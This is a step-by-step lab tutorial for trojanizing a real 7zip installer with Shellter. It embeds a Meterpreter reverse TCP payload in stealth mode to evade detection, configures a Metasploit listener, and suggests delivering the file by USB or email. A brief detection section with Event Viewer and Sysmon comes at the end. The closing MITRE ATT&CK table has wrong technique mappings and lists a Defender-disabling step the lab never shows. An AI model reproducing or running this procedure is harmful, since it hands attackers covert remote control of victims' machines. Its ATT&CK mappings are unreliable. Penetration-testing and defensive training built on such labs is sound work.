### **Lab: Installing and Using Shellter for PE File Injection**

This lab guides you through the process of installing **Shellter**, injecting a payload into a sample EXE file (7zip), and setting up a **Meterpreter listener** to receive the reverse connection.

---

### **Objective:**

- Install **Shellter** on a Kali Linux machine.
- Inject a **Meterpreter reverse TCP payload** into a benign EXE (7zip).
- Configure a **listener in Metasploit** to receive the reverse connection.

---

### **Prerequisites:**

- **Kali Linux** installed and up-to-date.
- Internet access for downloading dependencies and Shellter.
- **Metasploit Framework** installed.

---

## **Lab Instructions:**

---

### **Step 1: Install Shellter and Dependencies**

1. **Update and Fix Package Dependencies:**
    
    ```bash
    
    sudo apt-get update --fix-missing
    
    ```
    
2. **Install Wine (for running Windows binaries):**
    
    ```bash
    
    sudo su
    dpkg --add-architecture i386 && apt update && apt -y install wine32
    sudo apt install wine wine64 winbind winetricks
    
    ```
    
3. **Install Shellter:**
    
    ```bash
    
    sudo apt -y install shellter
    
    ```
    
4. **Run Shellter:**
    
    ```bash
    
    sudo shellter
    
    ```
    
    - If you encounter errors, **remove the `.wine` directory** and try again:
        
        ```bash
        
        rm -rf ~/.wine
        sudo shellter
        
        ```
        

---

### **Step 2: Prepare the EXE File for Injection**

1. **Download a Sample EXE:**
    - Use **7zip** as the target executable for the injection:
        
        ```bash
        
        wget https://www.7-zip.org/a/7z2107-x64.exe -O /home/kali/Downloads/7zip.exe
        
        ```
        

---

### **Step 3: Inject Payload into the EXE Using Shellter**

1. **Launch Shellter:**
    
    ```bash
    
    sudo shellter
    
    ```
    
2. **Choose Automatic Injection Mode:**
    - When prompted, select **Automatic (A)**.
3. **Specify the Location of the EXE:**
    - Provide the path to the 7zip EXE file:
        
        ```arduino
        
        /home/kali/Downloads/7zip.exe
        
        ```
        
4. **Enable Stealth Mode:**
    - Select **Y** to enable stealth mode, which makes detection more difficult.
5. **Select a Payload:**
    - When asked whether to use a **listed payload or custom (L/C/H)**, choose **L**.
6. **Select Payload Option:**
    - Choose **Option 1: meterpreter_reverse_tcp**.
7. **Configure Payload Parameters:**
    - Set the **LHOST** (your Kali IP) and **LPORT** (e.g., 4444).
        - Example:
            
            ```yaml
            
            LHOST: 192.168.1.100
            LPORT: 4444
            
            ```
            
8. **Generate the New EXE:**
    - Shellter will inject the payload and generate a new EXE file with the payload embedded.

---

### **Step 4: Configure the Metasploit Listener**

1. **Start Metasploit:**
    
    ```bash
    
    msfconsole
    
    ```
    
2. **Set Up the Exploit Handler:**
    
    ```bash
    
    use exploit/multi/handler
    set payload windows/meterpreter/reverse_tcp
    set lhost <your_Kali_IP>
    set lport 4444
    
    ```
    
3. **Run the Listener:**
    
    ```bash
    
    run
    
    ```
    
    - The listener will now wait for incoming connections.

---

### **Step 5: Execute the Malicious EXE**

1. **Transfer the Malicious EXE to the Target System:**
    - Use **USB**, **email**, or **file-sharing** to transfer the modified EXE to the target machine (for testing purposes only in an isolated environment).
2. **Run the EXE:**
    - Execute the modified EXE on the target system.
3. **Check for the Meterpreter Session:**
    - On the Metasploit console, you should see an active **Meterpreter session**:
        
        ```scss
        
        [*] Meterpreter session 1 opened (192.168.1.100:4444 -> 192.168.1.105:51542) at 2024-10-18 14:03:39 +0000
        
        ```
        

---

### **Step 6: Validate Detection Using Native Tools (Optional)**

1. **Check Windows Defender:**
    - If Windows Defender is enabled, check **Event Viewer > Windows Defender Operational Logs** for any detections.
2. **Review Process Creation Logs:**
    - Use **Event Viewer** to look for **Event ID 4688** under **Windows Logs > Security**, which logs process creation events.
3. **Use Sysmon (Optional for Better Visibility):**
    - If **Sysmon** is installed, monitor **process creation** and **network connections** under **Applications and Services Logs > Microsoft > Sysmon > Operational**.

### **MITRE ATT&CK Techniques Mapped to Lab Steps**

| **Step** | **Description** | **MITRE ATT&CK Technique** | **TTP ID** |
| --- | --- | --- | --- |
| **Payload Injection into EXE** | Injecting a **Meterpreter reverse TCP** payload into a benign EXE using Shellter. | Ingress Tool Transfer | T1105 |
| **Disabling Windows Defender** | Disabling antivirus to avoid detection of the malicious payload. | Impair Defenses: Disable or Modify Tools | T1562.001 |
| **Stealth Mode in Shellter** | Enabling **stealth mode** during injection to evade security detection. | Defense Evasion: Obfuscated Files or Information | T1027 |
| **EXE Execution on Target Machine** | Running the malicious EXE to establish a reverse connection to the C2 server. | User Execution | T1204.002 |
| **Meterpreter Reverse TCP Payload** | Establishing a **reverse TCP** connection back to a C2 server via Meterpreter. | Command and Control: Application Layer Protocol | T1071.001 |
| **Process Discovery on Target Machine** | Executing **Meterpreter commands** to list running processes on the target system. | Process Discovery | T1057 |
| **Configuring the C2 Listener** | Setting up a **Metasploit multi-handler** listener to accept reverse connections. | Command and Control: Ingress Tool Transfer | T1105 |
| **Process Creation Logging (Detection)** | Using **Event ID 4688** to detect suspicious process creation via Event Viewer. | Indicator Removal on Host: Process Termination | T1489 |
| **Sysmon Logging for Network and Process Activity** | Monitoring for suspicious behavior using **Sysmon** for advanced detection and logging. | System Network Configuration Discovery | T1016 |
